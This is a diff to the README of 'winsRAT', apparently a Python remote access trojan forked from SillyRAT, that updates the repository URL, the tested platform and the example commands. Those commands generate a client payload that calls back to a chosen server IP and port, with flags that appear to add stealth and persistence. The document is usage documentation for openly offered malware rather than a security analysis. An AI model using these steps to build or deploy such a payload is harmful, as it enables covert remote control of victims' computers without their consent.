@@ -18,11 +18,11 @@ winsRAT is written entirely in Python, developed from SillyRAT. winsRAT is a RAT
 
 
 ### Installation
-The tool is tested on **Parrot OS** with **Python 3.8**. 
+The tool is tested on **Windows** with **Python 3.13.4**. 
 Follow the steps for installation:
 ```
-$ git clone https://github.com/hash3liZer/SillyRAT.git
-$ cd SillyRAT/
+$ git clone https://github.com/ThemeHackers/winsRAT
+$ cd winsRAT/
 $ pip3 install -r requirements.txt
 ```
 
@@ -37,14 +37,14 @@ The source file is to remain same on all platforms. So, you can generate it on o
 
 ```
 $ python3 server.py generate -a server_ip -p server_port -o "C:\Users\{...}\Downloads\{name_output}" -s -per
-$ python3 server.py generate -a 192.168.1.100 -p 9001 -o "C:\Users\1com3456\Downloads\sillyrat" -s -per
+$ python3 server.py generate -a 192.168.1.100 -p 9001 -o "C:\Users\1com3456\Downloads\winsrat" -s -per
 ```
 
 The compiled version has to generated on the respective platform. For example, you can't generate an .exe file on Linux. You specifically have to be on Windows. The tool is still under testing. So, all kinds of errors are accepted. Make sure to open an issue though. Generating the Compiled Version for Linux:
 
 ```
-$ python3 server.py generate -a server_ip -p server_port -o "C:\Users\{...}\Downloads"
-$ python3 server.py generate -a 192.168.1.100 -p 9001 -o  "C:\Users\1com3456\Downloads\sillyrat"
+$ python3 server.py generate -a server_ip -p server_port -o "C:\Users\{...}\Downloads\{name_output}"
+$ python3 server.py generate -a 192.168.1.100 -p 9001 -o  "C:\Users\1com3456\Downloads\winsrat"
 ```
 
 <h6 align="center"><img src="https://user-images.githubusercontent.com/29171692/89173322-b74dc680-d5a1-11ea-8b3b-e5aa83cfbda1.png"></h6>
